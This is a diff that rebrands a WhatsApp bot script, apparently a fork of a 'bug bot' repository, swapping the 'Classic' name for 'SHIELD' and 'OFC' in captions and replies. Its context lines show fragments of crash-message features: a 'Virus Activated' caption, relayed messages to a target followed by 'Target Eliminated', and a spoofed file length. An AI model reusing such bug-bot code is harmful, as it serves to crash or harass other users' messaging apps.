+    "caption": `✳️᜴࿆͆᷍SHIELD╮⭑ ☠️⃰͜͡؜Virus⃟⭐️᜴▴Activatedཀ͜͡✅⃟╮.xp`,
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -2549,7 +2549,7 @@ message: {
 }), { userJid: m.chat, quoted: force })
 await zetsubo.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
 }
-await reply('💊𝗧𝗮𝗿𝗴𝗲𝘁 𝗘𝗹𝗶𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗯𝘆 Classic 📡')
+await reply('💊𝗧𝗮𝗿𝗴𝗲𝘁 𝗘𝗹𝗶𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗯𝘆 SHIELD 📡')
 }
 break
 //=================================================
@@ -2577,14 +2577,14 @@ showAdAttribution: false,
 renderLargerThumbnail: false,
 jpegThumbnail: ``,
 title: `𝕾𝖔𝖗𝖗𝖞 𝕭𝖗𝖔 𝕴 𝖌𝖔𝖙 𝕹𝖔 𝖒𝖊𝖗𝖈𝖞 𝖔𝖓 𝖞𝖔𝖚 🥵🙃`,
-body: `⁗ Classic 𝕰𝖑𝖎𝖒𝖎𝖓𝖆𝖙𝖊𝖘 📡`,
+body: `⁗ OFC 𝕰𝖑𝖎𝖒𝖎𝖓𝖆𝖙𝖊𝖘 📡`,
 previewType: "VIDEO",
 sourceUrl: `Classic 𝕾𝖚𝖈𝖐𝖘`,
 mediaType: 1,
 mediaUrl: `${global.url}`
 }
 },
-text: '📡𝗬𝗼𝘂 𝗖𝗮𝗻 𝗖𝗼𝗽𝘆 𝗕𝘂𝘁 𝗬𝗼𝘂 𝗖𝗮𝗻𝘁 𝗯𝗲 𝗠𝗲 🙃 𝗖𝗮𝗹𝗹 𝗠𝗲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 🩸'
+text: '📡𝗬𝗼𝘂 𝗖𝗮𝗻 𝗖𝗼𝗽𝘆 𝗕𝘂𝘁 𝗬𝗼𝘂 𝗖𝗮𝗻𝘁 𝗯𝗲 𝗠𝗲 🙃 𝗖𝗮𝗹𝗹 𝗠𝗲 BOTS OFC 🩸'
 }, {
 quoted: m
 })
@@ -2986,7 +2986,7 @@ zetsubo.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption:
 break
 //=================================================
 case 'runtime':
-                let pinga = `𝐂𝐥𝐚𝐬𝐬𝐢𝐜 𝐁𝐨𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`
+                let pinga = `SHIELD 𝐁𝐨𝐭 𝐡𝐚𝐬 𝐛𝐞𝐞𝐧 𝐫𝐮𝐧𝐧𝐢𝐧𝐠 𝐟𝐨𝐫 ${runtime(process.uptime())}`
                 zetsubo.sendMessage(m.chat, {
                     text: pinga,
                     contextInfo: {
@@ -3356,7 +3356,7 @@ case 'sc': case 'script': case 'repo':
 await inireact()
 
  zetsubo.sendMessage(m.chat, { image: { url: `https://telegra.ph/file/b103691007c8ce5ee8a94.jpg` }, caption: 
-`╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╮\n\n ➨ 𝑯𝒊 *${pushname}* \n\n ➨ 𝑰 𝒂𝒎 𝑪𝑳𝑨𝑺𝑺𝑰𝑪_𝑨𝑰 𝑩𝑶𝑻 ☣.\n\n ➨ 𝒀𝒐𝒖 𝑪𝒂𝒏 𝑮𝒆𝒕 𝑴𝒚 𝑺𝒐𝒖𝒓𝒄𝒆 𝑪𝒐𝒅𝒆 𝑽𝒊𝒂.\n\n ➨ 𝑻𝒉𝒆 𝑳𝒊𝒏𝒌 𝑩𝒆𝒍𝒐𝒘 ⇣⇣.\n\n ➨𝑭𝒐𝒓𝒌 𝑨𝒏𝒅 𝑮𝒊𝒗𝒆 𝑨 𝑺𝒕𝒂𝒓 ➻ ❴ https://github.com/Samue-l1/Classic-v3-BUG ❵\n\n ➨ 𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒕𝒂𝒌𝒆 𝒂 𝒍𝒐𝒐𝒌 𝒐𝒏 𝒓𝒆𝒂𝒅𝒎𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 𝒅𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕.\n\n ➨ 𝑴𝒂𝒅𝒆 𝑩𝒚 ➻ 𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 ✇\n\n╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯⸼` });
+`╭╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╮\n\n ➨ 𝑯𝒊 *${pushname}* \n\n ➨ 𝑰 𝒂𝒎 SHIELD_𝑨𝑰 𝑩𝑶𝑻 ☣.\n\n ➨ 𝒀𝒐𝒖 𝑪𝒂𝒏 𝑮𝒆𝒕 𝑴𝒚 𝑺𝒐𝒖𝒓𝒄𝒆 𝑪𝒐𝒅𝒆 𝑽𝒊𝒂.\n\n ➨ 𝑻𝒉𝒆 𝑳𝒊𝒏𝒌 𝑩𝒆𝒍𝒐𝒘 ⇣⇣.\n\n ➨𝑭𝒐𝒓𝒌 𝑨𝒏𝒅 𝑮𝒊𝒗𝒆 𝑨 𝑺𝒕𝒂𝒓 ➻ ❴ https://github.com/Samue-l1/Classic-v3-BUG ❵\n\n ➨ 𝑹𝒆𝒎𝒆𝒎𝒃𝒆𝒓 𝒕𝒐 𝒕𝒂𝒌𝒆 𝒂 𝒍𝒐𝒐𝒌 𝒐𝒏 𝒓𝒆𝒂𝒅𝒎𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 𝒅𝒆𝒑𝒍𝒐𝒚𝒎𝒆𝒏𝒕.\n\n ➨ 𝑴𝒂𝒅𝒆 𝑩𝒚 ➻ 𝐊𝐈𝐍𝐆 𝐒𝐀𝐌 ✇\n\n╰╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╼╯⸼` });
 
    break;
 //=================================================
@@ -3387,7 +3387,7 @@ case 'broadcast':
                         contextInfo: {
                             externalAdReply: {
                                 showAdAttribution: true,
-                                title: '𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓𝐄𝐃 𝐁𝐘 𝐂𝐋𝐀𝐒𝐒𝐈𝐂 𝐁𝐎𝐓',
+                                title: '𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓𝐄𝐃 𝐁𝐘 SHIELD 𝐁𝐎𝐓',
                                 body: `Sent ${i.length} Group`,
                                 thumbnailUrl: 'https://telegra.ph/file/d2a1d3bbfabf34fabe666.jpg',
                                 sourceUrl: 'https://chat.whatsapp.com/ETsxysQPYXxG1P8JQ1RQHV',
@@ -3613,7 +3613,7 @@ case 'swm': case 'take': case 'stickerwm': case 'steal': {
         if (isBanChat) return reply(mess.bangc);
         zetsubo.sendMessage(from, { react: { text: "🫡", key: m.key } })
 
-        if (!args.join(" ")) return reply(`use -take Classic Bot|By: 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`)
+        if (!args.join(" ")) return reply(`use -take SHIELD Bot|By: 𝕶𝖎𝖓𝖌 ANO`)
         const swn = args.join(" ")
         const pcknm = swn.split("|")[0];
         const atnm = swn.split("|")[1];
@@ -4169,7 +4169,7 @@ await inireact()
  pp2 = 'https://tinyurl.com/yx93l6da'; 
  } 
   if (!m.quoted) throw `Tag a user!`; 
- bar = `𝐏𝐫𝐨𝐟𝐢𝐥𝐞 𝐩𝐢𝐜𝐭𝐮𝐫𝐞 𝐨𝐟 ${qd} 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐛𝐲 𝐂𝐥𝐚𝐬𝐬𝐢𝐜-𝐀𝐢`; 
+ bar = `𝐏𝐫𝐨𝐟𝐢𝐥𝐞 𝐩𝐢𝐜𝐭𝐮𝐫𝐞 𝐨𝐟 ${qd} 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐛𝐲 SHIELD-𝐀𝐢`; 
  zetsubo.sendMessage(m.chat, { image: { url: pp2}, caption: bar, fileLength: "999999999999"}, { quoted: m}); 
  } 
  break;
